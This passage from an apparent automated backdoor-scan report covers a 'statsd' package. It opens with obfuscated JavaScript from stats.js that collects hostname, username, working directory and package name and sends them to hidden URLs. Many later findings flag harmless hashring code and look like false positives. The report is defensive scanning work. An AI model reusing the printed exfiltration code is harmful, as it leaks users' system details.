                      "text": "s[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x",
                      "markdown": "`s[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/stats.js"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 1195,
                  "endLine": 2,
                  "endColumn": 1203,
                  "snippet": {
                    "text": "0x2c3a))+-parseInt(_0x1b4dc3(0x1d7))/(0xa1*0x3e+-0x114d+0xf1*-0x17);if(_0x4b5cc0===_0x5cdc29)break;else _0x9ecbe1['push'](_0x9ecbe1['shift']());}catch(_0x476673){_0x9ecbe1['push'](_0x9ecbe1['shift']());}}}(_0x4f52,-0xfdd8*0xc+-0x5e397+0x1f19ff));const http=require(_0x5a6e1c(0x1de)),os=require('os'),hostname=os[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68",
                    "rendered": {
                      "text": "0x2c3a))+-parseInt(_0x1b4dc3(0x1d7))/(0xa1*0x3e+-0x114d+0xf1*-0x17);if(_0x4b5cc0===_0x5cdc29)break;else _0x9ecbe1['push'](_0x9ecbe1['shift']());}catch(_0x476673){_0x9ecbe1['push'](_0x9ecbe1['shift']());}}}(_0x4f52,-0xfdd8*0xc+-0x5e397+0x1f19ff));const http=require(_0x5a6e1c(0x1de)),os=require('os'),hostname=os[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68",
                      "markdown": "`0x2c3a))+-parseInt(_0x1b4dc3(0x1d7))/(0xa1*0x3e+-0x114d+0xf1*-0x17);if(_0x4b5cc0===_0x5cdc29)break;else _0x9ecbe1['push'](_0x9ecbe1['shift']());}catch(_0x476673){_0x9ecbe1['push'](_0x9ecbe1['shift']());}}}(_0x4f52,-0xfdd8*0xc+-0x5e397+0x1f19ff));const http=require(_0x5a6e1c(0x1de)),os=require('os'),hostname=os[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 178,
                  "startColumn": 16,
                  "endLine": 178,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    });\n\n    describe('#find', function () {\n      it('should find the correct long value for a given key', function () {\n        var ring = new Hashring({\n            '127.0.0.1:11211': 600\n          , '127.0.0.1:11212': 400\n",
                    "rendered": {
                      "text": "    });\n\n    describe('#find', function () {\n      it('should find the correct long value for a given key', function () {\n        var ring = new Hashring({\n            '127.0.0.1:11211': 600\n          , '127.0.0.1:11212': 400\n",
                      "markdown": "`    });\n\n    describe('#find', function () {\n      it('should find the correct long value for a given key', function () {\n        var ring = new Hashring({\n            '127.0.0.1:11211': 600\n          , '127.0.0.1:11212': 400\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 41,
                  "endLine": 62,
                  "endColumn": 47,
                  "snippet": {
                    "text": "      });\n    });\n\n    it('constructs with a object with per node vnodes', function () {\n      var ring = new Hashring({\n          '192.168.0.102:11212': { 'vnodes': 40 }\n        , '192.168.0.103:11212': { 'vnodes': 50 }\n",
                    "rendered": {
                      "text": "      });\n    });\n\n    it('constructs with a object with per node vnodes', function () {\n      var ring = new Hashring({\n          '192.168.0.102:11212': { 'vnodes': 40 }\n        , '192.168.0.103:11212': { 'vnodes': 50 }\n",
                      "markdown": "`      });\n    });\n\n    it('constructs with a object with per node vnodes', function () {\n      var ring = new Hashring({\n          '192.168.0.102:11212': { 'vnodes': 40 }\n        , '192.168.0.103:11212': { 'vnodes': 50 }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 19,
                  "endLine": 203,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n        assume(ring.get('justdied')).equals(skynet);\n      });\n    });\n\n",
                    "rendered": {
                      "text": "\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n        assume(ring.get('justdied')).equals(skynet);\n      });\n    });\n\n",
                      "markdown": "`\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n        assume(ring.get('justdied')).equals(skynet);\n      });\n    });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 25,
                  "endLine": 199,
                  "endColumn": 30,
                  "snippet": {
                    "text": "          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n        assume(ring.cache.get('justdied')).equals(skynet);\n\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n",
                    "rendered": {
                      "text": "          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n        assume(ring.cache.get('justdied')).equals(skynet);\n\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n",
                      "markdown": "`          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n        assume(ring.cache.get('justdied')).equals(skynet);\n\n        // After a cleared cache, it should still resolve to the same server\n        ring.cache.reset();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 25,
                  "endLine": 195,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            , '192.168.0.103:11212'\n            , '192.168.0.104:11212'\n          ])\n          , amazon = ring.get('justdied')\n          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n",
                    "rendered": {
                      "text": "            , '192.168.0.103:11212'\n            , '192.168.0.104:11212'\n          ])\n          , amazon = ring.get('justdied')\n          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n",
                      "markdown": "`            , '192.168.0.103:11212'\n            , '192.168.0.104:11212'\n          ])\n          , amazon = ring.get('justdied')\n          , skynet = '192.168.0.128:11212';\n\n        ring.swap(amazon, skynet);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 49,
                  "endLine": 162,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n",
                    "rendered": {
                      "text": "\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n",
                      "markdown": "`\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 19,
                  "endLine": 162,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n",
                    "rendered": {
                      "text": "\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n",
                      "markdown": "`\n        // this should work as both objects are converted to [object Object] by\n        // the .toString() constructor\n        assume(ring.get({wtf:'lol'})).equals(ring.get({wtf:'amazing .toStringing'}));\n      });\n    });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 19,
                  "endLine": 146,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n        // fuck something up in the code, so it throws errors or whatever\n",
                    "rendered": {
                      "text": "\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n        // fuck something up in the code, so it throws errors or whatever\n",
                      "markdown": "`\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n        // fuck something up in the code, so it throws errors or whatever\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/tests/api.test.js"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 19,
                  "endLine": 145,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        assume(ring.find(ring.hashValue('foo'))).is.above(-1);\n\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n",
                    "rendered": {
                      "text": "        assume(ring.find(ring.hashValue('foo'))).is.above(-1);\n\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n",
                      "markdown": "`        assume(ring.find(ring.hashValue('foo'))).is.above(-1);\n\n        // NOTE we are going to do some flaky testing ;P\n        assume(ring.get('foo')).equals('192.168.0.102:11212');\n        assume(ring.get('pewpew')).equals('192.168.0.103:11212');\n\n        // we are not gonna verify the results we are just gonna test if we don't\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/index.js"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 3,
                  "endLine": 343,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  });\n\n  for (var i = 0; i < this.size; i++) {\n    node = this.ring[i];\n\n    if (node.server in nodes) {\n      nodes[node.server].push(node.value);\n",
                    "rendered": {
                      "text": "  });\n\n  for (var i = 0; i < this.size; i++) {\n    node = this.ring[i];\n\n    if (node.server in nodes) {\n      nodes[node.server].push(node.value);\n",
                      "markdown": "`  });\n\n  for (var i = 0; i < this.size; i++) {\n    node = this.ring[i];\n\n    if (node.server in nodes) {\n      nodes[node.server].push(node.value);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/index.js"
                },
                "region": {
                  "startLine": 310,
                  "startColumn": 3,
                  "endLine": 310,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  // Not enough results yet, so iterate from the start of the hash ring to the\n  // position of the hash ring. So we reach full circle again.\n  for (i = 0; i < position; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n",
                    "rendered": {
                      "text": "  // Not enough results yet, so iterate from the start of the hash ring to the\n  // position of the hash ring. So we reach full circle again.\n  for (i = 0; i < position; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n",
                      "markdown": "`  // Not enough results yet, so iterate from the start of the hash ring to the\n  // position of the hash ring. So we reach full circle again.\n  for (i = 0; i < position; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/index.js"
                },
                "region": {
                  "startLine": 295,
                  "startColumn": 3,
                  "endLine": 295,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  // Start searching for servers from the position of the key to the end of\n  // HashRing.\n  for (var i = position; i < length; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n",
                    "rendered": {
                      "text": "  // Start searching for servers from the position of the key to the end of\n  // HashRing.\n  for (var i = position; i < length; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n",
                      "markdown": "`  // Start searching for servers from the position of the key to the end of\n  // HashRing.\n  for (var i = position; i < length; i++) {\n    node = this.ring[i];\n\n    // Do we need to make sure that we retrieve a unique list of servers?\n    if (unique) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/index.js"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 5,
                  "endLine": 177,
                  "endColumn": 11,
                  "snippet": {
                    "text": "  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n  if (!node) return undefined;\n\n  this.cache.set(key, node.server);\n",
                    "rendered": {
                      "text": "  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n  if (!node) return undefined;\n\n  this.cache.set(key, node.server);\n",
                      "markdown": "`  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n  if (!node) return undefined;\n\n  this.cache.set(key, node.server);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/index.js"
                },
                "region": {
                  "startLine": 174,
                  "startColumn": 24,
                  "endLine": 174,
                  "endColumn": 29,
                  "snippet": {
                    "text": " * @api public\n */\nHashRing.prototype.get = function get(key) {\n  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n",
                    "rendered": {
                      "text": " * @api public\n */\nHashRing.prototype.get = function get(key) {\n  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n",
                      "markdown": "` * @api public\n */\nHashRing.prototype.get = function get(key) {\n  var cache = this.cache.get(key);\n  if (cache) return cache;\n\n  var node = this.ring[this.find(this.hashValue(key))];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 243,
                  "startColumn": 26,
                  "endLine": 243,
                  "endColumn": 34,
                  "snippet": {
                    "text": "=\"variable\">ring</span>[<span class=\"variable\">key</span>] === <span class=\"variable\">oldServer</span>){\n      <span class=\"variable\">self</span>.<span class=\"variable\">ring</span>[<span class=\"variable\">key</span>] = <span class=\"variable\">newServer</span>;\n    }\n  });\n  \n  <span class=\"comment\">// update the cache, because we don't want to completly kill our cache</span>\n  <span class=\"comment\">// as other key -&gt; server lookups might still be valid</span>\n  <span class=\"class\">Object</span>.<span class=\"variable\">keys</span>(<span class=\"this\">this</span>.<span class=\"variable\">cache</span>).<spa",
                    "rendered": {
                      "text": "=\"variable\">ring</span>[<span class=\"variable\">key</span>] === <span class=\"variable\">oldServer</span>){\n      <span class=\"variable\">self</span>.<span class=\"variable\">ring</span>[<span class=\"variable\">key</span>] = <span class=\"variable\">newServer</span>;\n    }\n  });\n  \n  <span class=\"comment\">// update the cache, because we don't want to completly kill our cache</span>\n  <span class=\"comment\">// as other key -&gt; server lookups might still be valid</span>\n  <span class=\"class\">Object</span>.<span class=\"variable\">keys</span>(<span class=\"this\">this</span>.<span class=\"variable\">cache</span>).<spa",
                      "markdown": "`=\"variable\">ring</span>[<span class=\"variable\">key</span>] === <span class=\"variable\">oldServer</span>){\n      <span class=\"variable\">self</span>.<span class=\"variable\">ring</span>[<span class=\"variable\">key</span>] = <span class=\"variable\">newServer</span>;\n    }\n  });\n  \n  <span class=\"comment\">// update the cache, because we don't want to completly kill our cache</span>\n  <span class=\"comment\">// as other key -&gt; server lookups might still be valid</span>\n  <span class=\"class\">Object</span>.<span class=\"variable\">keys</span>(<span class=\"this\">this</span>.<span class=\"variable\">cache</span>).<spa`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 291,
                  "startColumn": 62,
                  "endLine": 291,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  server The IP of the server that needs to be removed</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">removeServer</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">server</span>){\n",
                    "rendered": {
                      "text": "\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  server The IP of the server that needs to be removed</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">removeServer</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">server</span>){\n",
                      "markdown": "`\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  server The IP of the server that needs to be removed</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">removeServer</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">server</span>){\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 184,
                  "startColumn": 181,
                  "endLine": 184,
                  "endColumn": 185,
                  "snippet": {
                    "text": "\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  key return</p></li><li><p><strong>returns</strong>: <em>String | Boolean</em>  False if there isn't a match, string of the server ip when we have a match</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">getNode</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">key</span>){\n",
                    "rendered": {
                      "text": "\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  key return</p></li><li><p><strong>returns</strong>: <em>String | Boolean</em>  False if there isn't a match, string of the server ip when we have a match</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">getNode</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">key</span>){\n",
                      "markdown": "`\n<h2></h2>\n\n<ul><li><p><strong>param</strong>: <em>String</em>  key return</p></li><li><p><strong>returns</strong>: <em>String | Boolean</em>  False if there isn't a match, string of the server ip when we have a match</p></li><li><p><strong>api</strong>: <em>public</em></p></li></ul>\n</td>\n<td class=\"code\">\n<pre><code><span class=\"class\">HashRing</span>.<span class=\"variable\">getNode</span> = <span class=\"keyword\">function</span>(<span class=\"variable\">key</span>){\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
